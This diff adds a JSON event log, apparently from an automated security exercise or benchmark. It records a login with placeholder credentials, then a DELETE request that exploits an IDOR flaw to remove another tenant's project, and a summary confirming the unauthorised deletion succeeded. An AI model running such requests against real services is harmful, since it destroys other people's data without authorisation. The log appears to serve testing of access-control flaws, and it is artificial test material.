@@ -1,0 +1,38 @@
+[
+  {
+    "event_id": "evt_2482f818ac5a4a4898564c2a826f1540",
+    "request": {
+      "follow_redirects": false,
+      "form_body": null,
+      "headers": {},
+      "json_body": {
+        "email": "user_25891183@exercise.invalid",
+        "password": "pw_13f0c27340e56ad6"
+      },
+      "method": "POST",
+      "path": "/auth/login",
+      "query": {}
+    },
+    "response_status": 200,
+    "type": "http_request"
+  },
+  {
+    "event_id": "evt_27ee9aa219c543b9b1b57d7ac9527a69",
+    "request": {
+      "follow_redirects": false,
+      "form_body": null,
+      "headers": {},
+      "json_body": null,
+      "method": "DELETE",
+      "path": "/v1/projects/6ebdca91-498e-4bde-85ca-a5a39c5c172d",
+      "query": {}
+    },
+    "response_status": 200,
+    "type": "http_request"
+  },
+  {
+    "status": "success",
+    "summary": "Signed in with the provided account and exploited the IDOR vulnerability in DELETE /v1/projects/{id} to delete project 6ebdca91-498e-4bde-85ca-a5a39c5c172d, which belongs to a different tenant. The server returned 200 OK, confirming the deletion succeeded without any ownership check.",
+    "type": "finish"
+  }
+]
